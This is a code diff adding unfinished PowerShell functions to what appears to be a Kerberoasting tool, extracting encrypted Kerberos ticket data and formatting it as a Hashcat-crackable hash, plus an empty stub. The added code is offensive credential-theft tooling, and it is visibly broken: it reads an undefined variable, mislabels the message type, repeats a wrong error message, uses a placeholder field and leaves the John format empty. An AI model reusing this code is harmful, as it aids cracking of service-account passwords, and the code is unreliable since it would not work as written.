@@ -103,3 +103,59 @@ function Get-KerberoastHashFromAPReq {
         }
     }
 }
+
+# TO BE IMPLEMENTED - NOT DONE
+function Get-KerberoastHashFromKrbCred {
+    [CmdletBinding()]
+    Param(
+        $Hash,
+
+        [ValidateSet('Hashcat','John')]
+        [string]
+        $HashFormat = 'Hashcat'
+    )
+
+    Process {
+        $a = $null
+        try {
+            if($Hash.GetType().Name -eq 'String') {
+                $Frame = $Hash -split "(?<=\G\w{2})(?=\w{2})" | %{ $a = $_;  [Convert]::ToByte( $_, 16 ) }
+            } else {
+                $Frame = [byte[]]$Hash
+            }
+        } catch {
+            throw "InputObject parameter is the wrong type.  Must be either a hex string or a byte array"
+        }
+
+
+        <# Parse the AP_REQ
+
+
+        #>
+
+        $ASN1Stream = New-Object -TypeName Org.BouncyCastle.Asn1.Asn1InputStream -ArgumentList @(,$APREQBytes)
+        $ApplicationTag = $ASN1Stream.ReadObject()
+        if($ApplicationTag.ApplicationTag -ne 14) {
+            throw "Incorrect ASN application tag.  Expected 14, but got $($ApplicationTag.ApplicationTag)"
+        }
+
+        $ASReq = $ApplicationTag.GetObject()
+
+        $Ticket = $EncTicketPart = $EncType = $null
+        try { $Ticket = $ASReq.GetObjectAt(3).GetObject().GetObject() } catch{ throw "Unable to get AS-REQ ticket field" }
+        try { $EncTicketPart = $Ticket.GetObjectAt(3).GetObject()     } catch{ throw "Unable to get ticket's EncTicketPart" }
+        try { $EncType = $EncTicketPart.GetObjectAt(0).GetObject().value.IntValue } catch { throw "Unable to get encryption type" }
+        try { $CipherText = $EncTicketPart.GetObjectAt(2).GetObject().Parser.ToString().Substring(1) } catch { throw "Unable to get encryption type" }
+
+        if($HashFormat -eq 'Hashcat') {
+            "`$krb5tgs`$$($EncType)`$*asdf*`$$($CipherText[0..15])`$$($CipherText[16..$CipherText.Length])"
+        } else {
+
+        }
+    }
+}
+
+# TO BE IMPLEMENTED - NOT DONE
+function Get-KerberoastHashFromTgsRep {
+
+}
